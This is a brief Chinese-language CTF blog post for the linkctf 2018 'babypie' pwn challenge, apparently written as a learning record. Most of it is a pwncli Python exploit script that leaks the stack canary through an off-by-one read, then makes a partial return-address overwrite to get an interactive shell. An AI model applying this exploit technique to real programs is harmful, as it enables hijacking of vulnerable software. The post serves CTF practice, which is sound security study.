# linkctf_2018.7_babypie



### 总结

`baby`中的`baby`，记录下`exp`，水一篇博客。

<!-- more -->

### Exp

```python
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

p.sendafter("Input your Name:\n", "a" * 0x29)
p.recvuntil("a" * 0x29)
msg = p.recvn(7)
canary = (u64(msg+b"\x00")) << 8
log_address("canary", canary)

p.send(flat(["a"*0x28, canary, 0, "\x3e"]))

p.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-08-22-linkctf-2018-7-babypie/  

